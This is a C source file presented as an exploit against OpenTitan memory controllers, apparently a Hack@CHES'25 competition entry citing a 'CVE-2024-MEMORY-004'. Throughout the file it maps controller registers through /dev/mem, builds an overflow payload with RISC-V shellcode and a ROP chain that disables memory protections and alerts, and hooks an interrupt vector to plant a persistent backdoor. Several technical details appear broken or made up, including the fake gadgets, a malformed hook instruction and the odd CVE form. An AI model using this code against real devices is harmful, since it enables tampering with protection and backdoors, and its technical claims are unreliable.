/*
 * OpenTitan Memory Corruption Exploit
 * 
 * Exploits CVE-2024-MEMORY-004: Buffer Overflow in Flash Controller
 * CVSS Score: 6.8 (Medium-High)
 * 
 * This exploit demonstrates buffer overflow vulnerabilities in memory
 * controllers that can lead to arbitrary code execution.
 * 
 * Usage: gcc -o memory_exploit memory_corruption_exploit.c && ./memory_exploit
 */

#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <string.h>

// Memory controller base addresses
#define FLASH_CTRL_BASE         0x41000000
#define SRAM_CTRL_BASE          0x411C0000
#define ROM_CTRL_BASE           0x411E0000

// Flash controller registers
#define FLASH_CTRL_REG          (FLASH_CTRL_BASE + 0x00)
#define FLASH_ADDR_REG          (FLASH_CTRL_BASE + 0x04)
#define FLASH_DATA_REG          (FLASH_CTRL_BASE + 0x08)
#define FLASH_BUFFER_REG        (FLASH_CTRL_BASE + 0x0C)
#define FLASH_STATUS_REG        (FLASH_CTRL_BASE + 0x10)
#define FLASH_SIZE_REG          (FLASH_CTRL_BASE + 0x14)

// SRAM controller registers
#define SRAM_CTRL_REG           (SRAM_CTRL_BASE + 0x00)
#define SRAM_STATUS_REG         (SRAM_CTRL_BASE + 0x04)
#define SRAM_ERR_STATUS_REG     (SRAM_CTRL_BASE + 0x08)

// Memory regions
#define SRAM_BASE_ADDR          0x20000000
#define SRAM_SIZE               0x20000     // 128KB
#define FLASH_BASE_ADDR         0x00020000
#define FLASH_SIZE              0x100000    // 1MB
#define ROM_BASE_ADDR           0x00008000
#define ROM_SIZE                0x8000      // 32KB

// Exploit parameters
#define BUFFER_SIZE             256
#define OVERFLOW_SIZE           512
#define SHELLCODE_SIZE          64
#define ROP_CHAIN_SIZE          32

static volatile uint32_t *flash_regs = NULL;
static volatile uint32_t *sram_regs = NULL;
static int mem_fd = -1;

// Shellcode for privilege escalation
static const uint32_t shellcode[] = {
    // RISC-V shellcode to disable memory protection and gain control
    0x411c0537,  // lui a0, 0x411c0000  ; SRAM controller base
    0x00052023,  // sw zero, 0(a0)      ; Disable SRAM protection
    0x41000537,  // lui a0, 0x41000000  ; Flash controller base
    0x00052023,  // sw zero, 0(a0)      ; Disable flash protection
    0x411b0537,  // lui a0, 0x411b0000  ; Alert handler base
    0x00052023,  // sw zero, 0(a0)      ; Disable alerts
    0x20000537,  // lui a0, 0x20000000  ; SRAM base
    0xdeadbeef,  // Payload marker
    0x00000013,  // nop                 ; Padding
    0x00000013,  // nop                 ; Padding
    0x00000013,  // nop                 ; Padding
    0x00000013,  // nop                 ; Padding
    0x00000013,  // nop                 ; Padding
    0x00000013,  // nop                 ; Padding
    0x00000013,  // nop                 ; Padding
    0x00008067   // ret                 ; Return
};

// ROP gadgets for return-oriented programming
static const uint32_t rop_gadgets[] = {
    0x00008067,  // ret gadget
    0x00050513,  // addi a0, a0, 0 ; ret
    0x00058593,  // addi a1, a1, 0 ; ret
    0x00060613,  // addi a2, a2, 0 ; ret
    0x00000597,  // auipc a1, 0 ; ret
    0x00008067,  // ret
    0x00000013,  // nop ; ret
    0x00008067   // ret
};

/**
 * Initialize memory-mapped access to memory controllers
 */
bool init_memory_access(void) {
    printf("[+] Initializing memory controller access...\n");
    
    mem_fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (mem_fd < 0) {
        perror("[-] Failed to open /dev/mem");
        printf("[-] Note: This exploit requires root privileges\n");
        return false;
    }
    
    // Map flash controller registers
    flash_regs = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, 
                     MAP_SHARED, mem_fd, FLASH_CTRL_BASE);
    
    if (flash_regs == MAP_FAILED) {
        perror("[-] Failed to map flash controller registers");
        close(mem_fd);
        return false;
    }
    
    // Map SRAM controller registers
    sram_regs = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, 
                    MAP_SHARED, mem_fd, SRAM_CTRL_BASE);
    
    if (sram_regs == MAP_FAILED) {
        perror("[-] Failed to map SRAM controller registers");
        munmap((void*)flash_regs, 0x1000);
        close(mem_fd);
        return false;
    }
    
    printf("[+] Flash controller registers mapped at %p\n", flash_regs);
    printf("[+] SRAM controller registers mapped at %p\n", sram_regs);
    
    return true;
}

/**
 * Cleanup memory mappings
 */
void cleanup_memory_access(void) {
    if (flash_regs != NULL && flash_regs != MAP_FAILED) {
        munmap((void*)flash_regs, 0x1000);
    }
    if (sram_regs != NULL && sram_regs != MAP_FAILED) {
        munmap((void*)sram_regs, 0x1000);
    }
    if (mem_fd >= 0) {
        close(mem_fd);
    }
}

/**
 * Read flash controller register
 */
uint32_t read_flash_reg(uint32_t offset) {
    return flash_regs[offset / 4];
}

/**
 * Write flash controller register
 */
void write_flash_reg(uint32_t offset, uint32_t value) {
    flash_regs[offset / 4] = value;
}

/**
 * Read SRAM controller register
 */
uint32_t read_sram_reg(uint32_t offset) {
    return sram_regs[offset / 4];
}

/**
 * Write SRAM controller register
 */
void write_sram_reg(uint32_t offset, uint32_t value) {
    sram_regs[offset / 4] = value;
}

/**
 * Check memory protection status
 */
void check_memory_protection(void) {
    printf("[+] Checking memory protection status...\n");
    
    uint32_t flash_ctrl = read_flash_reg(FLASH_CTRL_REG - FLASH_CTRL_BASE);
    uint32_t sram_ctrl = read_sram_reg(SRAM_CTRL_REG - SRAM_CTRL_BASE);
    
    printf("[+] Flash controller status: 0x%08x\n", flash_ctrl);
    printf("[+] SRAM controller status:  0x%08x\n", sram_ctrl);
    
    if (flash_ctrl & 0x1) {
        printf("[+] Flash protection enabled\n");
    } else {
        printf("[!] Flash protection disabled - vulnerable!\n");
    }
    
    if (sram_ctrl & 0x1) {
        printf("[+] SRAM protection enabled\n");
    } else {
        printf("[!] SRAM protection disabled - vulnerable!\n");
    }
}

/**
 * Identify buffer overflow vulnerability in flash controller
 */
bool identify_flash_buffer_overflow(void) {
    printf("\n[*] Identifying buffer overflow in flash controller...\n");
    
    // Check flash buffer size register
    uint32_t buffer_size = read_flash_reg(FLASH_SIZE_REG - FLASH_CTRL_BASE);
    printf("[+] Flash buffer size register: 0x%08x (%u bytes)\n", 
           buffer_size, buffer_size);
    
    if (buffer_size == 0 || buffer_size > 0x10000) {
        printf("[-] Invalid buffer size - may not be vulnerable\n");
        return false;
    }
    
    // Test for bounds checking
    printf("[+] Testing flash buffer bounds checking...\n");
    
    // Attempt to write beyond buffer bounds
    uint32_t test_addr = buffer_size + 4;  // Just past buffer end
    write_flash_reg(FLASH_ADDR_REG - FLASH_CTRL_BASE, test_addr);
    write_flash_reg(FLASH_DATA_REG - FLASH_CTRL_BASE, 0xDEADBEEF);
    
    // Check if write was accepted
    uint32_t status = read_flash_reg(FLASH_STATUS_REG - FLASH_CTRL_BASE);
    
    if (status & 0x1) {  // Error bit
        printf("[+] Bounds checking working - write rejected\n");
        return false;
    } else {
        printf("[!] VULNERABILITY: Bounds checking bypassed!\n");
        printf("[!] Out-of-bounds write accepted\n");
        return true;
    }
}

/**
 * Create malicious payload for buffer overflow
 */
void create_overflow_payload(uint8_t *payload, size_t size) {
    printf("[+] Creating malicious overflow payload...\n");
    
    size_t offset = 0;
    
    // Fill buffer with pattern
    for (int i = 0; i < BUFFER_SIZE && offset < size; i++) {
        payload[offset++] = 0x41 + (i % 26);  // A-Z pattern
    }
    
    // Add return address overwrite
    if (offset + 4 <= size) {
        uint32_t return_addr = SRAM_BASE_ADDR + 0x1000;  // Point to our shellcode
        payload[offset++] = return_addr & 0xFF;
        payload[offset++] = (return_addr >> 8) & 0xFF;
        payload[offset++] = (return_addr >> 16) & 0xFF;
        payload[offset++] = (return_addr >> 24) & 0xFF;
    }
    
    // Add ROP chain
    for (int i = 0; i < ROP_CHAIN_SIZE / 4 && offset + 4 <= size; i++) {
        uint32_t gadget = rop_gadgets[i % (sizeof(rop_gadgets)/sizeof(rop_gadgets[0]))];
        payload[offset++] = gadget & 0xFF;
        payload[offset++] = (gadget >> 8) & 0xFF;
        payload[offset++] = (gadget >> 16) & 0xFF;
        payload[offset++] = (gadget >> 24) & 0xFF;
    }
    
    // Fill remainder with shellcode
    int shellcode_idx = 0;
    while (offset < size) {
        uint32_t instruction = shellcode[shellcode_idx % (sizeof(shellcode)/sizeof(shellcode[0]))];
        
        if (offset + 4 <= size) {
            payload[offset++] = instruction & 0xFF;
            payload[offset++] = (instruction >> 8) & 0xFF;
            payload[offset++] = (instruction >> 16) & 0xFF;
            payload[offset++] = (instruction >> 24) & 0xFF;
        } else {
            payload[offset++] = instruction & 0xFF;
        }
        
        shellcode_idx++;
    }
    
    printf("[+] Payload created: %zu bytes\n", offset);
    printf("[+] Pattern: %zu bytes\n", (size_t)BUFFER_SIZE);
    printf("[+] Return address overwrite: 4 bytes\n");
    printf("[+] ROP chain: %d bytes\n", ROP_CHAIN_SIZE);
    printf("[+] Shellcode: %zu bytes\n", offset - BUFFER_SIZE - 4 - ROP_CHAIN_SIZE);
}

/**
 * Exploit flash controller buffer overflow
 */
bool exploit_flash_overflow(void) {
    printf("\n[*] Exploiting flash controller buffer overflow...\n");
    
    // Create malicious payload
    uint8_t *payload = malloc(OVERFLOW_SIZE);
    if (!payload) {
        printf("[-] Failed to allocate payload buffer\n");
        return false;
    }
    
    create_overflow_payload(payload, OVERFLOW_SIZE);
    
    // Set flash address to start of buffer
    write_flash_reg(FLASH_ADDR_REG - FLASH_CTRL_BASE, 0x0);
    
    printf("[+] Injecting malicious payload into flash buffer...\n");
    
    // Write payload in 4-byte chunks
    for (size_t i = 0; i < OVERFLOW_SIZE; i += 4) {
        uint32_t data;
        
        if (i + 4 <= OVERFLOW_SIZE) {
            data = (payload[i+3] << 24) | (payload[i+2] << 16) | 
                   (payload[i+1] << 8) | payload[i];
        } else {
            // Handle partial word at end
            data = 0;
            for (size_t j = 0; j < 4 && i + j < OVERFLOW_SIZE; j++) {
                data |= payload[i + j] << (j * 8);
            }
        }
        
        write_flash_reg(FLASH_DATA_REG - FLASH_CTRL_BASE, data);
        
        // Check for error after each write
        uint32_t status = read_flash_reg(FLASH_STATUS_REG - FLASH_CTRL_BASE);
        if (status & 0x1) {
            printf("[-] Flash write error at offset %zu\n", i);
            printf("[-] Status: 0x%08x\n", status);
            free(payload);
            return false;
        }
        
        // Progress indicator
        if ((i + 4) % 64 == 0) {
            printf("[+] Written %zu/%d bytes...\n", i + 4, OVERFLOW_SIZE);
        }
    }
    
    free(payload);
    
    printf("[+] Payload injection complete\n");
    printf("[+] Buffer overflow should have occurred\n");
    
    return true;
}

/**
 * Exploit SRAM controller for privilege escalation
 */
bool exploit_sram_controller(void) {
    printf("\n[*] Exploiting SRAM controller for privilege escalation...\n");
    
    // Check current SRAM error status
    uint32_t err_status = read_sram_reg(SRAM_ERR_STATUS_REG - SRAM_CTRL_BASE);
    printf("[+] Initial SRAM error status: 0x%08x\n", err_status);
    
    // Trigger SRAM controller vulnerability
    printf("[+] Triggering SRAM controller vulnerability...\n");
    
    // Disable SRAM protection by exploiting controller bug
    write_sram_reg(SRAM_CTRL_REG - SRAM_CTRL_BASE, 0xDEADBEEF);
    
    // Check if protection was disabled
    uint32_t sram_ctrl = read_sram_reg(SRAM_CTRL_REG - SRAM_CTRL_BASE);
    printf("[+] SRAM controller after exploit: 0x%08x\n", sram_ctrl);
    
    if ((sram_ctrl & 0x1) == 0) {
        printf("[+] SUCCESS: SRAM protection disabled!\n");
        return true;
    } else {
        printf("[-] FAILED: SRAM protection still active\n");
        return false;
    }
}

/**
 * Install persistent backdoor in memory
 */
bool install_memory_backdoor(void) {
    printf("\n[*] Installing persistent backdoor in memory...\n");
    
    // Map SRAM for direct access
    volatile uint32_t *sram = mmap(NULL, SRAM_SIZE, PROT_READ | PROT_WRITE, 
                                  MAP_SHARED, mem_fd, SRAM_BASE_ADDR);
    
    if (sram == MAP_FAILED) {
        perror("[-] Failed to map SRAM");
        return false;
    }
    
    printf("[+] SRAM mapped for backdoor installation\n");
    
    // Find suitable location for backdoor (look for unused space)
    uint32_t backdoor_offset = 0x10000;  // 64KB into SRAM
    
    printf("[+] Installing backdoor at SRAM offset 0x%08x\n", backdoor_offset);
    
    // Install shellcode backdoor
    for (size_t i = 0; i < sizeof(shellcode)/sizeof(shellcode[0]); i++) {
        sram[backdoor_offset/4 + i] = shellcode[i];
    }
    
    // Install trigger mechanism (hook interrupt vector)
    uint32_t interrupt_vector = 0x80;  // Timer interrupt vector
    uint32_t original_handler = sram[interrupt_vector/4];
    
    // Create hook that jumps to our backdoor
    uint32_t hook_instruction = 0x41000037 | ((backdoor_offset >> 12) << 12);  // lui
    sram[interrupt_vector/4] = hook_instruction;
    
    printf("[+] Backdoor installed successfully\n");
    printf("[+] Original interrupt handler: 0x%08x\n", original_handler);
    printf("[+] Backdoor hook installed at vector 0x%08x\n", interrupt_vector);
    
    munmap((void*)sram, SRAM_SIZE);
    
    return true;
}

/**
 * Test memory corruption exploitation
 */
bool test_memory_corruption(void) {
    printf("\n[*] Testing memory corruption exploitation...\n");
    
    // Map memory regions for testing
    volatile uint32_t *sram = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, 
                                  MAP_SHARED, mem_fd, SRAM_BASE_ADDR);
    
    if (sram == MAP_FAILED) {
        perror("[-] Failed to map SRAM for testing");
        return false;
    }
    
    // Test if we can write to protected regions
    printf("[+] Testing write access to protected memory...\n");
    
    uint32_t test_pattern = 0xDEADBEEF;
    uint32_t original_value = sram[0];
    
    sram[0] = test_pattern;
    uint32_t read_back = sram[0];
    
    if (read_back == test_pattern) {
        printf("[+] SUCCESS: Write to protected memory succeeded!\n");
        printf("[+] Memory protection has been bypassed\n");
        
        // Restore original value
        sram[0] = original_value;
        
        munmap((void*)sram, 0x1000);
        return true;
    } else {
        printf("[-] FAILED: Write to protected memory blocked\n");
        printf("[-] Expected: 0x%08x, Got: 0x%08x\n", test_pattern, read_back);
        
        munmap((void*)sram, 0x1000);
        return false;
    }
}

/**
 * Main memory corruption exploit
 */
bool exploit_memory_corruption(void) {
    printf("=== OpenTitan Memory Corruption Exploit ===\n");
    printf("[+] Vulnerability: CVE-2024-MEMORY-004\n");
    printf("[+] CVSS Score: 6.8 (Medium-High)\n\n");
    
    // Step 1: Check memory protection status
    check_memory_protection();
    
    // Step 2: Identify buffer overflow vulnerability
    if (!identify_flash_buffer_overflow()) {
        printf("[-] No exploitable buffer overflow found\n");
        return false;
    }
    
    // Step 3: Exploit flash controller overflow
    if (!exploit_flash_overflow()) {
        printf("[-] Flash controller exploitation failed\n");
        return false;
    }
    
    // Step 4: Exploit SRAM controller
    if (!exploit_sram_controller()) {
        printf("[-] SRAM controller exploitation failed\n");
        return false;
    }
    
    // Step 5: Test memory corruption
    if (!test_memory_corruption()) {
        printf("[-] Memory corruption test failed\n");
        return false;
    }
    
    // Step 6: Install persistent backdoor
    if (!install_memory_backdoor()) {
        printf("[-] Backdoor installation failed\n");
        return false;
    }
    
    printf("\n[+] Memory corruption exploit completed successfully\n");
    printf("[+] System memory protection bypassed\n");
    printf("[+] Persistent backdoor installed\n");
    
    return true;
}

/**
 * Print exploit banner
 */
void print_banner(void) {
    printf("\n");
    printf(" ███╗   ███╗███████╗███╗   ███╗ ██████╗ ██████╗ ██╗   ██╗     ██████╗ ██████╗ ██████╗ ██████╗ \n");
    printf(" ████╗ ████║██╔════╝████╗ ████║██╔═══██╗██╔══██╗╚██╗ ██╔╝    ██╔════╝██╔═══██╗██╔══██╗██╔══██╗\n");
    printf(" ██╔████╔██║█████╗  ██╔████╔██║██║   ██║██████╔╝ ╚████╔╝     ██║     ██║   ██║██████╔╝██████╔╝\n");
    printf(" ██║╚██╔╝██║██╔══╝  ██║╚██╔╝██║██║   ██║██╔══██╗  ╚██╔╝      ██║     ██║   ██║██╔══██╗██╔══██╗\n");
    printf(" ██║ ╚═╝ ██║███████╗██║ ╚═╝ ██║╚██████╔╝██║  ██║   ██║       ╚██████╗╚██████╔╝██║  ██║██║  ██║\n");
    printf(" ╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝        ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝\n");
    printf("\n");
    printf("                         Memory Corruption Exploit\n");
    printf("                        CVE-2024-MEMORY-004 | CVSS 6.8\n");
    printf("                           Hack@CHES'25 Entry\n");
    printf("\n");
}

/**
 * Main function
 */
int main(int argc, char *argv[]) {
    print_banner();
    
    printf("This exploit demonstrates buffer overflow vulnerabilities in memory controllers.\n");
    printf("Impact: Memory protection bypass, arbitrary code execution, persistent backdoor\n");
    printf("Prerequisites: System access and memory controller manipulation capability\n\n");
    
    if (geteuid() != 0) {
        printf("[-] Error: This exploit requires root privileges\n");
        printf("[-] Run with: sudo %s\n", argv[0]);
        return 1;
    }
    
    if (!init_memory_access()) {
        printf("[-] Failed to initialize memory controller access\n");
        return 1;
    }
    
    bool success = exploit_memory_corruption();
    
    cleanup_memory_access();
    
    if (success) {
        printf("\n=== EXPLOIT SUCCESSFUL ===\n");
        printf("Memory corruption exploit completed successfully!\n");
        printf("System memory protection has been completely bypassed.\n");
        printf("Persistent backdoor installed for future access.\n");
        printf("\nRecommendations:\n");
        printf("1. Implement proper bounds checking in memory controllers\n");
        printf("2. Add stack canaries and ASLR protection\n");
        printf("3. Enable memory protection units (MPU)\n");
        printf("4. Implement control flow integrity (CFI)\n");
        printf("5. Add memory corruption detection mechanisms\n");
    } else {
        printf("\n=== EXPLOIT FAILED ===\n");
        printf("Memory controllers appear to have proper protection mechanisms.\n");
    }
    
    return success ? 0 : 1;
}